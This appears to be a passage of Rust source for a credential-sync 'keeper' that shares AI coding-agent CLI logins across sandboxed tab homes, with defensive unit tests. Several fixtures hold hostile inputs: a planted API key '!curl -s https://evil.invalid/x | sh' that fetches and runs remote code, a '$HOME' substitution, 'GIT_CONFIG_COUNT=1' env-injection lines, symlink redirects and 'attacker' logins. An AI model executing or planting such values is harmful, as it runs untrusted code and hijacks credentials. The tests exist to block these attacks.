fn strip_claude_identity(file: &HomeFile) {
    let Some(mut value) = file
        .read()
        .and_then(|b| serde_json::from_slice::<serde_json::Value>(&b).ok())
    else {
        return;
    };
    if let Some(obj) = value.as_object_mut() {
        if obj.remove("oauthAccount").is_some() {
            if let Ok(body) = serde_json::to_vec_pretty(&value) {
                let _ = file.write(&body);
            }
        }
    }
}

/// One keeper pass over every home: every tab's write adopted first, then
/// the store placed everywhere, so nothing depends on the homes' order.
pub fn reconcile_all_in(state_dir: &Path) {
    let homes = crate::services::agent_home::existing_homes_in(state_dir);
    for home in &homes {
        reconcile_home_step(state_dir, home, Step::Adopt);
    }
    for home in &homes {
        reconcile_home_step(state_dir, home, Step::Place);
    }
}

fn keeper_lock() -> &'static Mutex<()> {
    static LOCK: OnceLock<Mutex<()>> = OnceLock::new();
    LOCK.get_or_init(|| Mutex::new(()))
}

/// Reconcile now (a tab just ended, which is when a login lands).
pub fn reconcile_now() {
    let _guard = keeper_lock().lock().unwrap_or_else(|p| p.into_inner());
    reconcile_all_in(&storage::state_dir());
}

/// Start the keeper: one detached thread that reconciles every home every
/// [`POLL`]. Holds no lock across the sleep and dies with the process.
pub fn start() {
    if let Err(e) = std::thread::Builder::new()
        .name("agent-auth".into())
        .spawn(|| loop {
            reconcile_now();
            std::thread::sleep(POLL);
        })
    {
        eprintln!("agent_auth: spawn keeper: {e}");
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn store_of(state: &Path, cli: &str, rel: &'static str) -> PathBuf {
        store_path_in(state, cli, &file(rel))
    }

    #[cfg(unix)]
    fn same_inode(a: &Path, b: &Path) -> bool {
        use std::os::unix::fs::MetadataExt;
        let (a, b) = (std::fs::metadata(a).unwrap(), std::fs::metadata(b).unwrap());
        (a.dev(), a.ino()) == (b.dev(), b.ino())
    }

    /// Write the way a CLI refreshing in place does: same inode, new bytes.
    fn write_in_place(path: &Path, bytes: &str) {
        use std::io::Write;
        let mut f = std::fs::OpenOptions::new().write(true).truncate(true).open(path).unwrap();
        f.write_all(bytes.as_bytes()).unwrap();
    }

    #[test]
    #[cfg(unix)]
    fn a_home_symlink_cannot_publish_a_host_file_as_a_shared_login() {
        let tmp = tempfile::tempdir().unwrap();
        let state = tmp.path().join("state");
        let home = crate::services::agent_home::scope_home_in(&state, "a");
        std::fs::create_dir_all(home.join(".codex")).unwrap();
        let secret = tmp.path().join("host-secret");
        std::fs::write(&secret, "private fixture").unwrap();
        std::os::unix::fs::symlink(&secret, home.join(".codex/auth.json")).unwrap();

        reconcile_home_in(&state, &home);

        assert!(!store_of(&state, "codex", ".codex/auth.json").exists());
        assert_eq!(std::fs::read_to_string(&secret).unwrap(), "private fixture");
    }

    #[test]
    #[cfg(unix)]
    fn a_home_directory_symlink_cannot_redirect_login_reconciliation() {
        let tmp = tempfile::tempdir().unwrap();
        let state = tmp.path().join("state");
        let home = crate::services::agent_home::scope_home_in(&state, "a");
        let outside = tmp.path().join("outside");
        std::fs::create_dir_all(&home).unwrap();
        std::fs::create_dir_all(&outside).unwrap();
        std::fs::write(outside.join("auth.json"), "private fixture").unwrap();
        std::os::unix::fs::symlink(&outside, home.join(".codex")).unwrap();

        reconcile_home_in(&state, &home);

        assert!(!store_of(&state, "codex", ".codex/auth.json").exists());
        assert_eq!(std::fs::read_to_string(outside.join("auth.json")).unwrap(), "private fixture");
        // With a login in the store, the linked directory is still not
        // written through.
        let store = store_of(&state, "codex", ".codex/auth.json");
        write_store(&store, b"{\"tokens\":{\"account_id\":\"me\"}}").unwrap();
        reconcile_home_in(&state, &home);
        assert_eq!(std::fs::read_to_string(outside.join("auth.json")).unwrap(), "private fixture");
    }

    #[test]
    #[cfg(unix)]
    fn seeding_claude_identity_replaces_a_link_without_writing_its_target() {
        let tmp = tempfile::tempdir().unwrap();
        let store = tmp.path().join("store");
        let home = tmp.path().join("home");
        let victim = tmp.path().join("victim");
        std::fs::create_dir_all(&store).unwrap();
        std::fs::create_dir_all(&home).unwrap();
        std::fs::write(store.join("identity.json"), r#"{"oauthAccount":{"emailAddress":"fixture@example.com"}}"#).unwrap();
        std::fs::write(&victim, "{}").unwrap();
        std::os::unix::fs::symlink(&victim, home.join(".claude.json")).unwrap();

        link_claude_identity(&store, &home);

        assert_eq!(std::fs::read_to_string(&victim).unwrap(), "{}");
        assert!(std::fs::symlink_metadata(home.join(".claude.json")).unwrap().is_file());
        assert_eq!(claude_account_in_home(&home).as_deref(), Some("fixture@example.com"));
    }

    #[test]
    fn a_login_written_in_one_home_is_adopted_and_copied_into_the_others() {
        let tmp = tempfile::tempdir().unwrap();
        let state = tmp.path();
        let a = crate::services::agent_home::scope_home_in(state, "a");
        let b = crate::services::agent_home::scope_home_in(state, "b");
        std::fs::create_dir_all(a.join(".codex")).unwrap();
        std::fs::create_dir_all(&b).unwrap();
        std::fs::write(a.join(".codex/auth.json"), r#"{"tokens":{"account_id":"acc-1","access_token":"t"}}"#).unwrap();
        reconcile_all_in(state);
        let store = store_of(state, "codex", ".codex/auth.json");
        assert!(store.is_file());
        assert!(std::fs::read_to_string(b.join(".codex/auth.json")).unwrap().contains("\"t\""));
        assert_eq!(read_sidecar(&store_dir_in(state, "codex"), ACCOUNT_FILE).as_deref(), Some("acc-1"));
        // Copies, not links: a tab's write is its own until adopted.
        #[cfg(unix)]
        {
            assert!(!same_inode(&store, &a.join(".codex/auth.json")));
            assert!(!same_inode(&store, &b.join(".codex/auth.json")));
        }

        // A rotation by rename in b: same account → adopted, a sees it.
        let fresh = b.join(".codex/auth.json.tmp");
        std::fs::write(&fresh, r#"{"tokens":{"account_id":"acc-1","access_token":"t2"}}"#).unwrap();
        std::fs::rename(&fresh, b.join(".codex/auth.json")).unwrap();
        reconcile_all_in(state);
        assert!(std::fs::read_to_string(a.join(".codex/auth.json")).unwrap().contains("t2"));

        // A refresh in place in a: adopted just the same, b sees it.
        write_in_place(&a.join(".codex/auth.json"), r#"{"tokens":{"account_id":"acc-1","access_token":"t3"}}"#);
        reconcile_all_in(state);
        assert!(std::fs::read_to_string(&store).unwrap().contains("t3"));
        assert!(std::fs::read_to_string(b.join(".codex/auth.json")).unwrap().contains("t3"));
        // Steady state: another pass changes nothing.
        reconcile_all_in(state);
        assert!(std::fs::read_to_string(a.join(".codex/auth.json")).unwrap().contains("t3"));
    }

    /// A local-model home only receives. `ollama launch` may rewrite a CLI's
    /// login file there (it did Cline's `providers.json`, per scope since
    /// 2026-10-08); adopted, every scope's CLI would switch to the local
    /// model, and placed over, the running local tab would lose its wiring.
    #[test]
    fn a_local_model_home_receives_logins_but_never_feeds_them_back() {
        let tmp = tempfile::tempdir().unwrap();
        let state = tmp.path();
        let rel = ".codex/auth.json";
        let own = crate::services::agent_home::scope_home_in(state, "a");
        let local = crate::services::agent_home::local_model_home_in(state, "a");
        std::fs::create_dir_all(own.join(".codex")).unwrap();
        std::fs::create_dir_all(&local).unwrap();
        std::fs::write(own.join(rel), r#"{"provider":"openai"}"#).unwrap();

        // A scope's own home still feeds the store; the local home receives.
        reconcile_all_in(state);
        let store = store_of(state, "codex", rel);
        assert!(std::fs::read_to_string(&store).unwrap().contains("openai"));
        assert!(std::fs::read_to_string(local.join(rel)).unwrap().contains("openai"));

        // A local-model launch rewrites the local copy: neither adopted nor
        // overwritten, on any pass.
        write_in_place(&local.join(rel), r#"{"provider":"ollama"}"#);
        reconcile_all_in(state);
        reconcile_home_in(state, &local);
        assert!(std::fs::read_to_string(&store).unwrap().contains("openai"));
        assert!(std::fs::read_to_string(own.join(rel)).unwrap().contains("openai"));
        assert!(std::fs::read_to_string(local.join(rel)).unwrap().contains("ollama"));

        // A file the local home wrote before anything was placed is its own too.
        let fresh = crate::services::agent_home::local_model_home_in(state, "b");
        std::fs::create_dir_all(fresh.join(".codex")).unwrap();
        std::fs::write(fresh.join(rel), r#"{"provider":"ollama"}"#).unwrap();
        reconcile_all_in(state);
        assert!(std::fs::read_to_string(&store).unwrap().contains("openai"));
        assert!(std::fs::read_to_string(fresh.join(rel)).unwrap().contains("ollama"));
    }

    #[test]
    fn a_local_model_home_never_records_claude_identity() {
        let tmp = tempfile::tempdir().unwrap();
        let state = tmp.path();
        let local = crate::services::agent_home::local_model_home_in(state, "a");
        std::fs::create_dir_all(&local).unwrap();
        std::fs::write(local.join(".claude.json"), r#"{"oauthAccount":{"emailAddress":"fixture@example.com"}}"#).unwrap();
        reconcile_home_in(state, &local);
        assert!(!store_dir_in(state, "claude").join("identity.json").exists());
    }

    #[test]
    fn only_a_local_model_key_reads_as_a_local_model_home() {
        let state = Path::new("/state");
        assert!(crate::services::agent_home::is_local_model_home(
            &crate::services::agent_home::local_model_home_in(state, "p1")
        ));
        assert!(!crate::services::agent_home::is_local_model_home(
            &crate::services::agent_home::scope_home_in(state, "p1")
        ));
        assert!(!crate::services::agent_home::is_local_model_home(
            &crate::services::agent_home::scope_home_in(state, crate::services::agent_home::HOST_SCOPE_KEY)
        ));
    }

    /// The guard holds for every kind of write now: a login as another
    /// account, whether the tab renamed a new file in or rewrote its copy in
    /// place, never reaches the store or the other homes, and the store's
    /// copy is put back.
    #[test]
    fn a_login_as_another_account_is_refused_however_it_was_written() {
        let tmp = tempfile::tempdir().unwrap();
        let state = tmp.path();
        let a = crate::services::agent_home::scope_home_in(state, "a");
        let b = crate::services::agent_home::scope_home_in(state, "b");
        let host = crate::services::agent_home::host_home_in(state);
        std::fs::create_dir_all(a.join(".codex")).unwrap();
        std::fs::create_dir_all(b.join(".codex")).unwrap();
        std::fs::create_dir_all(&host).unwrap();
        std::fs::write(a.join(".codex/auth.json"), r#"{"tokens":{"account_id":"user"}}"#).unwrap();
        reconcile_all_in(state);
        let store = store_of(state, "codex", ".codex/auth.json");
        let holds_user = |p: &Path| std::fs::read_to_string(p).unwrap().contains("\"user\"");
        assert!(holds_user(&host.join(".codex/auth.json")));

        // By rename.
        std::fs::remove_file(b.join(".codex/auth.json")).unwrap();
        std::fs::write(b.join(".codex/auth.json"), r#"{"tokens":{"account_id":"attacker"}}"#).unwrap();
        reconcile_all_in(state);
        assert!(holds_user(&store));
        assert!(holds_user(&a.join(".codex/auth.json")));
        assert!(holds_user(&host.join(".codex/auth.json")));
        assert!(holds_user(&b.join(".codex/auth.json")));
        let status: Vec<LoginStatus> = status_in(state, tmp.path());
        let codex = status.iter().find(|s| s.id == "codex").unwrap();
        assert_eq!(codex.blocked.as_ref().and_then(|b| b.account.as_deref()), Some("attacker"));
        assert!(codex.signed_in);

        // In place: the write that used to change every home at once.
        write_in_place(&b.join(".codex/auth.json"), r#"{"tokens":{"account_id":"attacker2"}}"#);
        assert!(holds_user(&store), "the store is its own inode");
        assert!(holds_user(&host.join(".codex/auth.json")));
        reconcile_all_in(state);
        assert!(holds_user(&store));
        assert!(holds_user(&a.join(".codex/auth.json")));
        assert!(holds_user(&b.join(".codex/auth.json")));
        let status: Vec<LoginStatus> = status_in(state, tmp.path());
        let codex = status.iter().find(|s| s.id == "codex").unwrap();
        assert_eq!(codex.blocked.as_ref().and_then(|b| b.account.as_deref()), Some("attacker2"));
    }

    /// Pi runs an API key that starts with `!` as a shell command on every
    /// read. A fenced tab that writes one must not see it placed into any
    /// other scope, least of all the unfenced Host session.
    #[test]
    fn a_login_that_names_a_command_is_never_shared() {
        let tmp = tempfile::tempdir().unwrap();
        let state = tmp.path();
        let a = crate::services::agent_home::scope_home_in(state, "a");
        let b = crate::services::agent_home::scope_home_in(state, "b");
        let host = crate::services::agent_home::host_home_in(state);
        for home in [&a, &b] {
            std::fs::create_dir_all(home.join(".pi/agent")).unwrap();
        }
        std::fs::create_dir_all(&host).unwrap();
        let good = r#"{"anthropic":{"type":"api_key","key":"sk-ant-literal"}}"#;
        std::fs::write(a.join(".pi/agent/auth.json"), good).unwrap();
        reconcile_all_in(state);
        let store = store_of(state, "pi", ".pi/agent/auth.json");
        let holds_literal = |p: &Path| std::fs::read_to_string(p).unwrap().contains("sk-ant-literal");
        assert!(holds_literal(&store));
        assert!(holds_literal(&host.join(".pi/agent/auth.json")));

        for planted in [
            r#"{"anthropic":{"type":"api_key","key":"!curl -s https://evil.invalid/x | sh"}}"#,
            r#"{"anthropic":{"type":"api_key","key":"sk-ant-literal"},"openai":{"type":"api_key","key":"$HOME"}}"#,
        ] {
            write_in_place(&b.join(".pi/agent/auth.json"), planted);
            reconcile_all_in(state);
            assert!(holds_literal(&store), "the store keeps the literal key");
            assert!(holds_literal(&a.join(".pi/agent/auth.json")));
            assert!(holds_literal(&host.join(".pi/agent/auth.json")));
            assert!(holds_literal(&b.join(".pi/agent/auth.json")), "the planted file is overwritten");
            let status: Vec<LoginStatus> = status_in(state, tmp.path());
            let pi = status.iter().find(|s| s.id == "pi").unwrap();
            assert!(pi.blocked.as_ref().and_then(|b| b.command.as_deref()).is_some_and(|f| f.ends_with(".key")));
            assert!(pi.signed_in);
        }

        // A later literal login clears the block.
        write_in_place(&b.join(".pi/agent/auth.json"), r#"{"anthropic":{"type":"api_key","key":"sk-ant-rotated"}}"#);
        reconcile_all_in(state);
        assert!(std::fs::read_to_string(host.join(".pi/agent/auth.json")).unwrap().contains("rotated"));
        let status: Vec<LoginStatus> = status_in(state, tmp.path());
        assert!(status.iter().find(|s| s.id == "pi").unwrap().blocked.is_none());
        assert_eq!(names_command("pi", b"not json"), None);
        assert_eq!(names_command("codex", br#"{"tokens":{"access_token":"!x"}}"#), None);
    }

    /// A home linked by an older Tabtivity to the store's inode gets a copy of
    /// its own on the first pass, so its in-place writes stop reaching the
    /// store directly.
    #[test]
    #[cfg(unix)]
    fn a_hard_link_from_an_older_app_is_replaced_by_a_copy() {
        let tmp = tempfile::tempdir().unwrap();
        let state = tmp.path();
        let a = crate::services::agent_home::scope_home_in(state, "a");
        std::fs::create_dir_all(a.join(".codex")).unwrap();
        let store = store_of(state, "codex", ".codex/auth.json");
        write_store(&store, b"{\"tokens\":{\"account_id\":\"user\"}}").unwrap();
        std::fs::write(store_dir_in(state, "codex").join(ACCOUNT_FILE), "user").unwrap();
        std::fs::hard_link(&store, a.join(".codex/auth.json")).unwrap();
        assert!(same_inode(&store, &a.join(".codex/auth.json")));

        reconcile_all_in(state);

        assert!(!same_inode(&store, &a.join(".codex/auth.json")));
        write_in_place(&a.join(".codex/auth.json"), r#"{"tokens":{"account_id":"attacker"}}"#);
        assert!(std::fs::read_to_string(&store).unwrap().contains("\"user\""));
    }

    #[test]
    fn a_login_directory_is_reconciled_file_by_file() {
        let tmp = tempfile::tempdir().unwrap();
        let state = tmp.path();
        let a = crate::services::agent_home::scope_home_in(state, "a");
        let b = crate::services::agent_home::scope_home_in(state, "b");
        let creds = ".kimi-code/credentials";
        std::fs::create_dir_all(a.join(creds)).unwrap();
        std::fs::create_dir_all(&b).unwrap();
        std::fs::write(a.join(creds).join("kimi-code.json"), "k1").unwrap();
        reconcile_all_in(state);
        let store = store_path_in(state, "kimi", &dir(creds, DirNames::Json));
        assert_eq!(std::fs::read_to_string(store.join("kimi-code.json")).unwrap(), "k1");
        assert_eq!(std::fs::read_to_string(b.join(creds).join("kimi-code.json")).unwrap(), "k1");
        assert!(status_in(state, tmp.path()).iter().find(|s| s.id == "kimi").unwrap().signed_in);
        write_in_place(&b.join(creds).join("kimi-code.json"), "k2");
        reconcile_all_in(state);
        assert_eq!(std::fs::read_to_string(a.join(creds).join("kimi-code.json")).unwrap(), "k2");
        sign_out_in(state, "kimi").unwrap();
        assert!(!a.join(creds).join("kimi-code.json").exists());
        assert!(!store.exists());
    }

    /// Gap 16: a login folder shares only the names its CLI writes a login
    /// under. A temporary caught mid-write, a dotenv file an agent planted,
    /// CodeBuddy's logout backup and its `.logged-out` marker are neither
    /// adopted nor placed, and do not count as signed in.
    #[test]
    fn a_login_directory_shares_only_allowlisted_names() {
        let tmp = tempfile::tempdir().unwrap();
        let state = tmp.path();
        let a = crate::services::agent_home::scope_home_in(state, "a");
        let b = crate::services::agent_home::scope_home_in(state, "b");
        let host = crate::services::agent_home::host_home_in(state);
        std::fs::create_dir_all(&b).unwrap();
        std::fs::create_dir_all(&host).unwrap();

        // Kimi.
        let kimi = ".kimi-code/credentials";
        std::fs::create_dir_all(a.join(kimi)).unwrap();
        for stray in ["kimi-code.json.tmp.1.ab", "x.env"] {
            std::fs::write(a.join(kimi).join(stray), "GIT_CONFIG_COUNT=1").unwrap();
        }
        reconcile_all_in(state);
        let kimi_store = store_path_in(state, "kimi", &dir(kimi, DirNames::Json));
        assert!(store_dir_files(&kimi_store).is_empty());
        assert!(!status_in(state, tmp.path()).iter().find(|s| s.id == "kimi").unwrap().signed_in);
        std::fs::write(a.join(kimi).join("kimi-code.json"), "k1").unwrap();
        reconcile_all_in(state);
        assert_eq!(store_dir_files(&kimi_store), vec!["kimi-code.json".to_string()]);
        for home in [&b, &host] {
            assert_eq!(std::fs::read_to_string(home.join(kimi).join("kimi-code.json")).unwrap(), "k1");
            assert!(!home.join(kimi).join("kimi-code.json.tmp.1.ab").exists());
            assert!(!home.join(kimi).join("x.env").exists());
        }

        // CodeBuddy.
        let cb = ".local/share/CodeBuddyExtension/Data/Public/auth";
        let login = "Tencent-Cloud.coding-copilot.info";
        let backup = "Tencent-Cloud.coding-copilot.2026-10-08T12-34-56-789Z.4242.0f8fad5b-d9cb-469f-a165-70867728950e.info";
        let marker = "Tencent-Cloud.coding-copilot.info.logged-out";
        std::fs::create_dir_all(a.join(cb)).unwrap();
        for name in [login, backup, marker] {
            std::fs::write(a.join(cb).join(name), name).unwrap();
        }
        reconcile_all_in(state);
        let cb_store = store_path_in(state, "codebuddy", &dir(cb, DirNames::CodeBuddyInfo));
        assert_eq!(store_dir_files(&cb_store), vec![login.to_string()]);
        for home in [&b, &host] {
            assert!(home.join(cb).join(login).is_file());
            assert!(!home.join(cb).join(backup).exists());
            assert!(!home.join(cb).join(marker).exists());
        }
        // The home that wrote them keeps them; they are its own.
        assert!(a.join(cb).join(backup).is_file());
        assert!(a.join(cb).join(marker).is_file());
    }

    #[test]
    fn dir_names_admit_only_the_login_file_shapes() {
        for ok in ["kimi-code.json", "other-oauth.json"] {
            assert!(DirNames::Json.admits(ok), "{ok}");
        }
        for no in [".json", ".kimi-code.json", "kimi-code.json.tmp.1.ab", "x.env", "token", "a/b.json", ""] {
            assert!(!DirNames::Json.admits(no), "{no}");
        }
        for ok in ["Tencent-Cloud.coding-copilot.info", "Tencent-Cloud.coding-copilot-x-code.example.invalid.info"] {
            assert!(DirNames::CodeBuddyInfo.admits(ok), "{ok}");
        }
        for no in [
            "Tencent-Cloud.coding-copilot.2026-10-08T12-34-56-789Z.4242.0f8fad5b-d9cb-469f-a165-70867728950e.info",
            "Tencent-Cloud.coding-copilot.info.logged-out",
            ".Tencent-Cloud.coding-copilot.info.4242.0f8fad5b-d9cb-469f-a165-70867728950e.tmp",
            "Tencent-Cloud.coding-copilot.info.lock",
            ".info",
            "x.env",
        ] {
            assert!(!DirNames::CodeBuddyInfo.admits(no), "{no}");
        }
    }

    /// Gap 16: nothing the registry shares is a file a CLI loads as its
    /// environment or its configuration.
    #[test]
    fn no_registry_row_shares_an_env_or_config_file() {
        for (cli, paths) in registry() {
            for path in paths {
                let name = path.rel.rsplit('/').next().unwrap_or(path.rel);
                assert!(!name.ends_with(".env") && name != ".env", "{cli}: {}", path.rel);
                assert!(name != "providers.json", "{cli}: {}", path.rel);
                assert!(!name.starts_with("config.") && !name.starts_with("settings."), "{cli}: {}", path.rel);
                assert!(!["crush.json", "config.yaml", "config.toml"].contains(&name), "{cli}: {}", path.rel);
            }
            for (retired_cli, rel) in RETIRED {
                assert!(
                    !paths.iter().any(|p| p.rel == *rel),
                    "{cli} shares the retired {retired_cli} path {rel}"
                );
            }
        }
    }

    /// Gap 16 migration: the retired files' store goes; every fenced and
    /// local-model home keeps its copy (the login survives there); the Host
    /// home loses the copy Tabtivity put there and keeps one it wrote itself.
    #[test]
    fn retiring_a_shared_path_keeps_scope_copies_and_clears_the_hosts() {
        let tmp = tempfile::tempdir().unwrap();
        let state = tmp.path();
        let a = crate::services::agent_home::scope_home_in(state, "a");
        let local = crate::services::agent_home::local_model_home_in(state, "a");
        let host = crate::services::agent_home::host_home_in(state);
        let vibe = ".vibe/.env";
        let cline = ".cline/data/settings/providers.json";
        let aider = ".aider/oauth-keys.env";
        let store = |cli: &str, rel: &str| store_dir_in(state, cli).join(leaf_of(rel));
        let put = |path: &Path, body: &str| {
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(path, body).unwrap();
        };
        // Vibe: the Host copy equals the store's current bytes.
        put(&store("vibe", vibe), "VIBE_FIXTURE=shared");
        for home in [&a, &local, &host] {
            put(&home.join(vibe), "VIBE_FIXTURE=shared");
        }
        // Cline: the store moved on; the Host copy is what it last placed there.
        put(&store("cline", cline), r#"{"v":2}"#);
        put(&host.join(cline), r#"{"v":1}"#);
        write_placed(&store_dir_in(state, "cline"), &host, &leaf_of(cline), &digest(br#"{"v":1}"#));
        put(&a.join(cline), r#"{"v":2}"#);
        // Aider: the Host session wrote its own file, never adopted.
        put(&store("aider", aider), "AIDER_FIXTURE=store");
        put(&host.join(aider), "AIDER_FIXTURE=host");
        // Codex is still shared and untouched by the retirement.
        put(&store("codex", ".codex/auth.json"), r#"{"tokens":{"account_id":"me"}}"#);

        retire_shared_paths_in(state);

        for cli in ["vibe", "cline", "aider"] {
            assert!(!store_dir_in(state, cli).exists(), "{cli} store");
        }
        assert!(store("codex", ".codex/auth.json").is_file());
        for home in [&a, &local] {
            assert_eq!(std::fs::read_to_string(home.join(vibe)).unwrap(), "VIBE_FIXTURE=shared");
        }
        assert_eq!(std::fs::read_to_string(a.join(cline)).unwrap(), r#"{"v":2}"#);
        assert!(!host.join(vibe).exists());
        assert!(!host.join(cline).exists());
        assert_eq!(std::fs::read_to_string(host.join(aider)).unwrap(), "AIDER_FIXTURE=host");
        // No longer shared: a write in one scope stays there.
        let b = crate::services::agent_home::scope_home_in(state, "b");
        std::fs::create_dir_all(&b).unwrap();
        write_in_place(&a.join(vibe), "GIT_CONFIG_COUNT=1");
        reconcile_all_in(state);
        assert!(!b.join(vibe).exists());
        assert!(!host.join(vibe).exists());
        assert_eq!(std::fs::read_to_string(local.join(vibe)).unwrap(), "VIBE_FIXTURE=shared");
        assert!(!store_dir_in(state, "vibe").exists());

        // A second run is a no-op.
        retire_shared_paths_in(state);
        assert_eq!(std::fs::read_to_string(host.join(aider)).unwrap(), "AIDER_FIXTURE=host");
        assert_eq!(std::fs::read_to_string(a.join(vibe)).unwrap(), "GIT_CONFIG_COUNT=1");
        assert!(store("codex", ".codex/auth.json").is_file());
    }

    /// Gap 16 migration for login folders: a name the allowlist no longer
    /// admits leaves the store and its records, and a home's copy of it goes
    /// only where it is still what the store placed there.
    #[test]
    fn retiring_drops_unlisted_names_from_login_folders() {
        let tmp = tempfile::tempdir().unwrap();
        let state = tmp.path();
        let a = crate::services::agent_home::scope_home_in(state, "a");
        let b = crate::services::agent_home::scope_home_in(state, "b");
        let host = crate::services::agent_home::host_home_in(state);
        let kimi = ".kimi-code/credentials";
        let store_dir = store_dir_in(state, "kimi");
        let store = store_path_in(state, "kimi", &dir(kimi, DirNames::Json));
        std::fs::create_dir_all(&store).unwrap();
        std::fs::write(store.join("kimi-code.json"), "k1").unwrap();
        std::fs::write(store.join("x.env"), "GIT_CONFIG_COUNT=1").unwrap();
        let leaf = |name: &str| format!("{}_{name}", leaf_of(kimi));
        for home in [&a, &b, &host] {
            std::fs::create_dir_all(home.join(kimi)).unwrap();
            std::fs::write(home.join(kimi).join("kimi-code.json"), "k1").unwrap();
            write_placed(&store_dir, home, &leaf("kimi-code.json"), &digest(b"k1"));
            std::fs::write(home.join(kimi).join("x.env"), "GIT_CONFIG_COUNT=1").unwrap();
            write_placed(&store_dir, home, &leaf("x.env"), &digest(b"GIT_CONFIG_COUNT=1"));
        }
        // b changed its copy since: its own write, kept.
        write_in_place(&b.join(kimi).join("x.env"), "OWN=1");

        retire_shared_paths_in(state);

        assert_eq!(store_dir_files(&store), vec!["kimi-code.json".to_string()]);
        for home in [&a, &host] {
            assert!(!home.join(kimi).join("x.env").exists());
            assert!(read_placed(&store_dir, home, &leaf("x.env")).is_none());
        }
        assert_eq!(std::fs::read_to_string(b.join(kimi).join("x.env")).unwrap(), "OWN=1");
        for home in [&a, &b, &host] {
            assert_eq!(std::fs::read_to_string(home.join(kimi).join("kimi-code.json")).unwrap(), "k1");
            assert!(read_placed(&store_dir, home, &leaf("kimi-code.json")).is_some());
        }
        // A second run changes nothing.
        retire_shared_paths_in(state);
        assert_eq!(std::fs::read_to_string(b.join(kimi).join("x.env")).unwrap(), "OWN=1");
        assert!(store.join("kimi-code.json").is_file());
    }

    #[test]
    fn import_copies_only_allowlisted_names_of_a_login_folder() {
        let tmp = tempfile::tempdir().unwrap();
        let state = tmp.path().join("state");
        let user = tmp.path().join("user");
        let a = crate::services::agent_home::scope_home_in(&state, "a");
        std::fs::create_dir_all(&a).unwrap();
        let kimi = ".kimi-code/credentials";
        std::fs::create_dir_all(user.join(kimi).join("nested")).unwrap();
        std::fs::write(user.join(kimi).join("nested/deep.json"), "d").unwrap();
        std::fs::write(user.join(kimi).join("x.env"), "GIT_CONFIG_COUNT=1").unwrap();
        // Nothing admitted: nothing to import.
        assert!(import_from_user_home_in(&state, &user, "kimi").is_err());
        assert!(!status_in(&state, &user).iter().find(|s| s.id == "kimi").unwrap().importable);
        std::fs::write(user.join(kimi).join("kimi-code.json"), "k1").unwrap();
        assert!(status_in(&state, &user).iter().find(|s| s.id == "kimi").unwrap().importable);
        assert_eq!(import_from_user_home_in(&state, &user, "kimi"), Ok(1));
        let store = store_path_in(&state, "kimi", &dir(kimi, DirNames::Json));
        assert_eq!(store_dir_files(&store), vec!["kimi-code.json".to_string()]);
        assert!(!store.join("nested").exists());
        assert_eq!(std::fs::read_to_string(a.join(kimi).join("kimi-code.json")).unwrap(), "k1");
        assert!(!a.join(kimi).join("x.env").exists());
        assert!(!a.join(kimi).join("nested").exists());
    }

    #[test]
    fn import_copies_the_users_files_and_sign_out_forgets_them_everywhere() {
        let tmp = tempfile::tempdir().unwrap();
        let state = tmp.path().join("state");
        let user = tmp.path().join("user");
        std::fs::create_dir_all(user.join(".codex")).unwrap();
        std::fs::write(user.join(".codex/auth.json"), r#"{"tokens":{"account_id":"me"}}"#).unwrap();
        std::fs::write(user.join(".codex/config.toml"), "[mcp_servers.x]\ncommand='x'\n").unwrap();
        let a = crate::services::agent_home::scope_home_in(&state, "a");
        std::fs::create_dir_all(a.join(".codex")).unwrap();
        // A refused login in a: the import replaces it like any other copy.
        std::fs::write(a.join(".codex/auth.json"), r#"{"tokens":{"account_id":"other"}}"#).unwrap();
        assert_eq!(import_from_user_home_in(&state, &user, "codex"), Ok(1));
        assert!(std::fs::read_to_string(a.join(".codex/auth.json")).unwrap().contains("\"me\""));
        // Only the login: the config with its MCP servers is not imported.
        assert!(!a.join(".codex/config.toml").exists());
        assert!(import_from_user_home_in(&state, &user, "kiro").is_err());
        sign_out_in(&state, "codex").unwrap();
        assert!(!a.join(".codex/auth.json").exists());
        assert!(!store_dir_in(&state, "codex").exists());
        assert!(!status_in(&state, &user).iter().find(|s| s.id == "codex").unwrap().signed_in);
    }

    #[test]
    fn first_start_imports_missing_logins_once_and_keeps_existing_ones() {
        let tmp = tempfile::tempdir().unwrap();
        let state = tmp.path().join("state");
        let user = tmp.path().join("user");
        std::fs::create_dir_all(user.join(".codex")).unwrap();
        std::fs::create_dir_all(user.join(".claude")).unwrap();
        std::fs::write(user.join(".codex/auth.json"), r#"{"tokens":{"account_id":"me"}}"#).unwrap();
        std::fs::write(user.join(".claude/.credentials.json"), "user").unwrap();
        // Claude is already in the store (the older mirror was adopted).
        let claude = store_of(&state, "claude", ".claude/.credentials.json");
        std::fs::create_dir_all(claude.parent().unwrap()).unwrap();
        std::fs::write(&claude, "mirror").unwrap();
        import_once_in(&state, &user);
        assert!(store_of(&state, "codex", ".codex/auth.json").is_file());
        assert_eq!(std::fs::read_to_string(&claude).unwrap(), "mirror");
        // A sign-out afterwards stays: the import never runs again.
        sign_out_in(&state, "codex").unwrap();
        import_once_in(&state, &user);
        assert!(!store_of(&state, "codex", ".codex/auth.json").exists());
    }

    #[test]
    fn claude_identity_follows_the_credentials_and_is_seeded_into_new_homes() {
        let tmp = tempfile::tempdir().unwrap();
        let state = tmp.path();
        let a = crate::services::agent_home::scope_home_in(state, "a");
        let b = crate::services::agent_home::scope_home_in(state, "b");
        std::fs::create_dir_all(a.join(".claude")).unwrap();
        std::fs::create_dir_all(&b).unwrap();
        std::fs::write(a.join(".claude/.credentials.json"), r#"{"claudeAiOauth":{"accessToken":"x"}}"#).unwrap();
        std::fs::write(a.join(".claude.json"), r#"{"oauthAccount":{"emailAddress":"me@x"},"hasCompletedOnboarding":true,"projects":{"/p":{}}}"#).unwrap();
        reconcile_all_in(state);
        assert!(b.join(".claude/.credentials.json").is_file());
        let seeded: serde_json::Value = serde_json::from_slice(&std::fs::read(b.join(".claude.json")).unwrap()).unwrap();
        assert_eq!(seeded["oauthAccount"]["emailAddress"], "me@x");
        assert!(seeded.get("projects").is_none());
        assert_eq!(read_sidecar(&store_dir_in(state, "claude"), ACCOUNT_FILE).as_deref(), Some("me@x"));
    }

    #[test]
    fn fence_env_is_per_cli_and_never_overrides_the_users_value() {
        let mut env = std::collections::HashMap::new();
        env.insert("GOOSE_DISABLE_KEYRING".to_string(), "0".to_string());
        apply_fence_env("/usr/bin/goose", &mut env);
        assert_eq!(env["GOOSE_DISABLE_KEYRING"], "0");
        apply_fence_env("vibe", &mut env);
